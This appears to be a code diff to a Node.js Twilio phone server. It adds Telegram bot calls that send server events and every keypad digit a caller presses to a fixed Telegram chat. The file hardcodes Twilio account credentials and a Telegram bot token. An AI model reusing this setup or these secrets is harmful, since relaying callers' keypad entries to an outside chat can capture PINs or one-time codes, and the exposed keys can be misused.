@@ -1,14 +1,18 @@
 const express = require('express');
+const axios = require('axios') 
 const bodyParser = require('body-parser');
 const VoiceResponse = require('twilio').twiml.VoiceResponse;
 const client = require('twilio')('AC17dc9fe91f769fba66f6e8611597b0b7', 'ff1eb0ed390bc6f23dfb9a4e4821d0b9');
 
 const app = express();
 const port = 3000;
+axios.get('https://api.telegram.org/bot6779436184:AAFGKAstq58C0VLpUfDkA4dqebGmpNj3vUs/sendMessage?chat_id=5113588348&text=Server started') 
+
 
 app.use(bodyParser.urlencoded({ extended: true }));
 
 app.post('/outgoing-call', (req, res) => {
+axios.get('https://api.telegram.org/bot6779436184:AAFGKAstq58C0VLpUfDkA4dqebGmpNj3vUs/sendMessage?chat_id=5113588348&text=Received outgoing call') 
   const twiml = new VoiceResponse();
 
   twiml.gather({
@@ -26,6 +30,7 @@ app.post('/outgoing-call', (req, res) => {
 app.post('/handle-key', (req, res) => {
   const digitPressed = req.body.Digits;
   console.log(`Digit pressed: ${digitPressed}`);
+  axios.get('https://api.telegram.org/bot6779436184:AAFGKAstq58C0VLpUfDkA4dqebGmpNj3vUs/sendMessage?chat_id=5113588348&text=Digit pressed: ' + digitPressed) 
 
   // Add logic to handle the pressed digit
 
